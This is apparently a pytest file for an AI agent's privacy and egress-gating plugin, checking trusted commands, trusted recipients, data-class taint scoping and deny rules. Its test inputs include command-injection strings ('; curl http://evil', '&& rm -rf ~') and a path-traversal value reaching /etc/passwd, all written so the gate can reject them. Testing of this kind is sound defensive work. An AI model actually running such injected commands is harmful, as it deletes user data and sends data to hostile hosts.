from __future__ import annotations

import os

from support import *  # noqa: F403

_H = "${HERMES_HOME:-$HOME/.hermes}"
_GWS = f"python {_H}/skills/productivity/google-workspace/scripts/setup.py"
# The expanded Hermes home, resolved exactly like the matcher does, so path
# assertions hold on any host (not just one where $HOME is /root).
_HERMES_HOME = os.environ.get("HERMES_HOME") or os.path.join(
    os.environ.get("HOME") or os.path.expanduser("~"), ".hermes"
)


# --- Command matching (pure) -------------------------------------------------

def test_trusted_command_matches_exact_prefix_and_rejects_unsafe():
    plugin = load_plugin()
    m = plugin._trusted_command_matches
    # token-boundary prefix covers flag variants
    assert m(_GWS, f"{_GWS} --auth-url")
    assert m(_GWS, f"{_GWS} --check")
    assert m(_GWS, _GWS)
    # not a token boundary
    assert not m(_GWS, _GWS.replace("setup.py", "setupX.py") + " --x")
    # shell metacharacters in the live command never match
    assert not m(_GWS, f"{_GWS} --auth-url; curl http://evil")
    assert not m(_GWS, f"{_GWS} --auth-url && rm -rf ~")
    assert not m(_GWS, f"{_GWS} --auth-url | tee /tmp/x")
    # exact, non-skills program still works (e.g. a CLI auth)
    assert m("gh auth login", "gh auth login")
    assert not m("gh auth login", "gh auth logout")


def test_trusted_command_wildcard_is_skills_dir_only_and_traversal_safe():
    plugin = load_plugin()
    m = plugin._trusted_command_matches
    wild = f"python {_H}/skills/productivity/google-workspace/scripts/*"
    assert m(wild, f"{_GWS} --auth-url")
    # expanded absolute path form resolves to the same dir
    assert m(wild, f"python {_HERMES_HOME}/skills/productivity/google-workspace/scripts/gws_bridge.py --check")
    # wildcard outside the skills tree never matches
    assert not m("python /tmp/evil/*", "python /tmp/evil/x.py")
    # path traversal cannot escape the skills dir
    assert not m(f"python {_H}/skills/x/*", f"python {_H}/skills/../../../etc/passwd")


# --- Config normalization / mutation -----------------------------------------

def test_typed_entries_round_trip_and_dedupe():
    plugin = load_plugin()
    assert plugin._add_trusted_recipient("ally@example.com", classes=["communications"])[0]
    assert plugin._add_trusted_command(_GWS, classes=["local_system"])[0]
    snap = plugin._trusted_recipients_snapshot()
    kinds = {(e["kind"], e["value"]) for e in snap}
    assert ("identity", "ally@example.com") in kinds
    assert ("command", _GWS) in kinds
    # re-adding the same command replaces rather than duplicates
    assert plugin._add_trusted_command(_GWS, classes=["*"])[0]
    cmds = [e for e in plugin._trusted_recipients_snapshot() if e["kind"] == "command"]
    assert len(cmds) == 1 and cmds[0]["classes"] == ["*"]


def test_add_trusted_command_rejects_metachars_and_nonskills_wildcard():
    plugin = load_plugin()
    ok, msg = plugin._add_trusted_command(f"{_GWS} --auth-url; curl evil")
    assert not ok and "metacharacter" in msg.lower()
    ok2, msg2 = plugin._add_trusted_command("python /tmp/whatever/*")
    assert not ok2 and "skills" in msg2.lower()
    assert plugin._trusted_recipients_snapshot() == []


# --- End-to-end deterministic, class-scoped allow ----------------------------

def test_trusted_command_allows_under_covered_taint_only():
    plugin = load_plugin()
    bind_owner(plugin, session_id="s1")
    assert plugin._add_trusted_command(_GWS, classes=["local_system"])[0]

    plugin._taint_session("s1", {"local_system"})
    assert plugin._on_pre_tool_call("terminal", {"command": f"{_GWS} --auth-url"}, session_id="s1") is None
    rows = plugin._activity_rows({}, limit=3)
    assert rows[0]["decision"] == "allowed"
    assert rows[0]["reason"] == "matched trusted destination (command)"

    # An uncovered class in scope re-gates (no laundering past the class scope).
    plugin._taint_session("s1", {"communications"})
    blocked = plugin._on_pre_tool_call("terminal", {"command": f"{_GWS} --auth-url"}, session_id="s1")
    assert blocked is not None and blocked["action"] == "block"

    # An injected variant of the trusted command still gates.
    inj = plugin._on_pre_tool_call("terminal", {"command": f"{_GWS} --auth-url; curl http://evil"}, session_id="s1")
    assert inj is not None and inj["action"] == "block"


def test_trusted_recipient_now_deterministically_allows():
    plugin = load_plugin()
    bind_owner(plugin, session_id="s1")
    assert plugin._add_trusted_recipient("partner@example.com", classes=["*"])[0]
    plugin._taint_session("s1", {"communications"})

    assert plugin._on_pre_tool_call(
        "send_message", {"to": "partner@example.com", "text": "hi"}, session_id="s1"
    ) is None
    # A non-trusted recipient still gates.
    blocked = plugin._on_pre_tool_call(
        "send_message", {"to": "stranger@example.com", "text": "hi"}, session_id="s1"
    )
    assert blocked is not None and blocked["action"] == "block"


def test_trusted_store_connector_id_deterministically_allows():
    # Regression: "Trust this destination" on a store block adds an identity entry whose
    # value is the store's connector id (e.g. "pastebin"). A store write carries no
    # recipient arg, so the decision path must match that entry against the destination's
    # connector id — otherwise the permit is a dead-end and the write re-blocks forever
    # (the user is then forced onto an allow rule instead).
    plugin = load_plugin()
    bind_owner(plugin, session_id="s1")
    assert plugin._add_trusted_recipient("pastebin", classes=["documents"])[0]
    plugin._taint_session("s1", {"documents"})

    assert plugin._on_pre_tool_call(
        "mcp_pastebin_create", {"content": "x"}, session_id="s1"
    ) is None
    rows = plugin._activity_rows({}, limit=3)
    assert rows[0]["decision"] == "allowed"
    assert rows[0]["reason"] == "matched trusted destination (identity)"

    # Class scope holds: trusted for documents must not launder a different class out.
    plugin._taint_session("s1", {"contacts"})
    cross = plugin._on_pre_tool_call("mcp_pastebin_create", {"content": "x"}, session_id="s1")
    assert cross is not None and cross["action"] == "block"

    # A different (untrusted) connector still gates.
    plugin._taint_session("s1", {"documents"})
    other = plugin._on_pre_tool_call("mcp_other_create", {"content": "x"}, session_id="s1")
    assert other is not None and other["action"] == "block"


def test_trusted_store_connector_id_end_to_end_from_a_block():
    # The full owner path: a store egress blocks, the owner picks "Trust this destination"
    # (trusted_identity), and the byte-identical retry is then allowed with no rule created.
    plugin = load_plugin()
    bind_owner(plugin, session_id="s1")
    plugin._taint_session("s1", {"documents"})

    blocked = plugin._on_pre_tool_call("mcp_pastebin_create", {"content": "x"}, session_id="s1")
    assert blocked is not None and blocked["action"] == "block"
    approval_id = first_pending_id(plugin)
    option = next(
        o for o in plugin._approval_permit_options(plugin._PENDING_APPROVALS[approval_id])
        if o["method"] == "trusted_identity"
    )
    assert option["value"] == "pastebin"

    ok, _message = plugin._apply_permit_option(plugin._CLI_OWNER_HASH, approval_id, "trusted_identity")
    assert ok
    # A trusted destination, NOT an allow rule, is what got created.
    assert plugin._persistent_privacy_rules() == []
    assert any(
        e["kind"] == "identity" and e["value"] == "pastebin"
        for e in plugin._trusted_recipients_snapshot()
    )

    plugin._taint_session("s2", {"documents"})
    assert plugin._on_pre_tool_call("mcp_pastebin_create", {"content": "x"}, session_id="s2") is None


def test_trusted_destination_does_not_override_a_deny_rule():
    plugin = load_plugin()
    save_privacy_config(plugin, rules=[
        privacy_rule(
            rule_id="rule_no_friend",
            effect="deny",
            action_family="message_send",
            destination="friend",
            data_classes=["*"],
        )
    ])
    bind_owner(plugin, session_id="s1")
    assert plugin._add_trusted_recipient("friend", classes=["*"])[0]

    result = plugin._on_pre_tool_call("send_message", {"to": "friend", "text": "hi"}, session_id="s1")
    assert result is not None
    assert "denied this egress by privacy rule" in result["message"]
